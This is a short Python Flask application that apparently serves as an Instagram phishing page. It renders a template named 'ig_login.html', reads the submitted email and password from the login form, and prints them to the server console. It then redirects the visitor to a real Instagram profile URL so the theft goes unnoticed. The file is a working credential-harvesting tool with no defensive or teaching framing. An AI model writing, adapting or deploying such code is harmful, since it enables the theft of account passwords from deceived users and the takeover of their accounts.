from flask import Flask, request, redirect, url_for, render_template

app = Flask(__name__)

@app.route("/login", methods=["POST", "GET"])
def login_page():
    if request.method == "POST":
        username = request.form.get("email")
        password = request.form.get("password")
        print("Username:", username)
        print("Password:", password)
        return redirect('https://www.instagram.com/insgram_acc_user/#')  

    return render_template("ig_login.html")

@app.route("/success")
def success_page():
    return "Login successful!"

if __name__ == "__main__":
    app.run(port=8000)
    




